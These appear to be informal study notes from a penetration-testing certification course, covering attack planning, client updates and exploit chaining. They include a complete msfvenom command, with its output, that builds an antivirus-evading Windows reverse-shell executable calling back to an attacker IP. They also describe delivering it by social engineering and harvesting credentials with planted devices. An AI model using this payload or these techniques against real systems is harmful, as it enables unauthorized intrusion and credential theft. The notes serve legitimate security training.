# This is the Exploitation training from It-pro-tv
# pt.1 with zach memos and dan lowrie

	- so when going over the results from your vuln scans you want to focus on the low hanging fruit first and then work your way up
	the chain.
	- you want to play to your strengths. if your good at sql start at the sql injection first then move on from there
	- research research research. and then you add research to that and you got it.
	- here is where we will be forming a plan of attack.
	- organize all the vulns from high to low
	- then start with the one you feel is best for your skill set 

# would probably be running through exploitdb right meow and or searchsploit. 

	- you want a game plan before you go poking stuff. just like we game planned when coaching.
 	- you dont want to go off have cocked like a king of the hill match. take your time
	- 'leave no stone unturned. inevitably the exploit you dont try is the one that works. almost no matter what.' - dan lowrie

# it is not uncommon to have a physical check list/ game plan. 
	
	- plan of attack from first exploit to last file log deleted. 
	- just do one everytime because we will use it in our final paper work
	- this is super helpful if you can walk them through the process like a coach walks players through a new game plan.
	 they don't know how to tackle or catch at the level i'm doing it at but everyone knows what a tackle and a catch look like. 
	- this also helps when you are in the middle of an engagement and the client calls for an update


# instructor says being able to give by the minuete updates if neccessary is much easier with an attack plan. 
	- hello mr. cx ... reading from the list. we have ran this scan and this scan we are waiting on results from that and then we will 
	move into blah blah...
	- so when we have a plan of attack just like a gameplan we can make notes adjustments and document it real time without losing true context in which the information 		was obtained.
	- ATTACK PLANS FOR PRESIDENT! lol haha

# typically you have a week to get a shell
	- in the mean time they will want updates and thats exactly what the game plan is for. 
	- you need to pretend that they work for you and you are training them on cyber security. oh yeah. you get 7 days.

 	- if you can't get a shell then you can't get a shell but you need to make sure you have exhausted all options.
	- keeping your game plan with comments and notes to present at the end of the engagement helps teach them and double check you.
	- preparing the notes and explaining them is reliving them which means if there was/is somthing else I could do. the idea is to 
	find it in my rehearsal thought rather then the morning of in the middle of an explanation.

	- in other words: rehearse your thought process the night before going in for explanation
# money$ if they don't have the budget to pay for my time or the tools neccessary
# maybe I don't have the resources neccessary to grab the software or hardware I need for the engagement
  i.e. new krypton is like an $8,000 computer. it would be my password cracking box for sure.
	 if you come across a long enough password policy or just long passwords. 
	 cracking these could take a lot of time with out the right resources/ gear
# listen
	 if the client tells you to focus in a certain place focus in a certain place. do not go rouge. lol just listen, document, review, execute

# ITEMS called out in the PENT TEST PLUS exam

	- common techniques to complete these attacks
		> cross compiling code i.e. how to get a payload from kali into windows format so that it can run
			- metasploit's msfvenom and meterpreter that allow you to configure custom payloads that will give you RCE, Ddos, root, etc..
			- this allows us to create a custom payload for the windows platform. i.e. get the payload converted to .exe so it
			will execute in the windows environment/ on a windows box 



# example of msfvenom   $:~# msfvenom -a x86 --platform windows -p windows/shell reverse tcp LHOST=10.0.0.107 LPORT= 4444 -b "\x00\x0a\xod" -e x86/shikata ga nai -f exe -o exploit.exe
		
		- the -a flag is letting it know that it is 32 bit software
		- tells it the platform is windows -p windows
		- the '-a' flag selects architecture
		- '--platform' select a platform Cisco, OSX, BSD, netbsd, NodeJS, javascript php, ruby, etc... 
		- LOHOST = local host or your ip address
		- '-b' is for bad characters. i.e things i dont want these bits in my payload, which could cause it to not work
		you also want to make sure it's wrapped in double quotes. "
			> bits: "\x00\x0a\xod" and "\x20 also very common
			> these characters are new line, return characters, dollar sign. these chars are bad and we are telling venom not to use them
		- '-e' is to select an encoder. the encoder is meant to help it get past (circumvent) anti-virus mal-ware detection systems 
			> -e x86/shikata ga nai 
			> the encoders job is to attempt to obfuscate or hide the payload from the systems mentioned above.
# the example below shows us creating a payload and the final details like size and where it was written as well as status of the job successful or failed 

$:~# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.0.0.107 LPORT=4444 -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f exe -o msf_exploit-test1.exe

# this is the example output

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: msf_exploit-test1.exe

# so now at this point we would social engineer the file 'msf_exploit-test.exe' on to a machine. whether it be e-mail, usb stick, etc

	- port modification can happen as well, note: PORT: 443 is encrypted and usually allowed through firewalls
	- you may have to change the port# or the ip address on an exploit you find in the wild. we kind of knew this but its great to hear it again
	- PORT/ IPS / ENCODERS are all variables that need to be modified or at the very least confirmed BEFORE using the exploitation you found. 
	- note: when your on an engagement and your trying to get a vuln to work and you have NO other options you can create a virtual environment to simulate the box/netw		ork we are testing  		
		> the instructor used this method to discover that the 'memmory' was off by just a few bits.
		> he made the adjustmeant to where the memmory location is. so that the memmory is in the right slots. that way the payload can be fired off 



================ Exploitation Prep pt 2
=======================================


	- chaining exploits: shell shock/ dirty cow/ would be used to escalate and get root privaleges being strung on top of
	whatever vulnerability i exposed to get onto the system/network. 
	- working through your attack paln/ game plan
	- ex:
		> 1 SQL injection for authentication bypass
		> 2 logged in as user. file upload privileges 
		> 3 command injection vulnerability
		> 4 use command injection to inject the payload we created earlier.
		> 5 now we have a rev shell. but your only www-data
		> 6 privilege escalation priv esc.
		> 7 top of the mountain

	- ex: 
		> 1 physical attack: break into one of the targets installations (base of opperation) using a social engineering attack 
		> 2 plug in 'rubber ducky', 'key logger', 'network sniffer', 'land turtle',
		> 3 this gives us the ability to sniff the data across the network 
		> 4 with packet sniffing you can start credential harvesting
		> 5 grab some clear text creds out of wireshark
		> 6 maybe the creds were admin creds and we now have root access

			
# just a couple examples of how you would 'string' exploits together. we have been doing this for a long while now but again it is always comforting to have it reaffirmed.

vulnhub??

# Proof of Concept and exploit development

# Searchsploit examples
 
 :~# searchsploit windows xp priv esc
	> these are all proofs of concept and we just adjust these to fit our needs according to the results from the scans on the box
	> you can also go to the website exploit-DB.com this is the same thing as searchsploit

		
































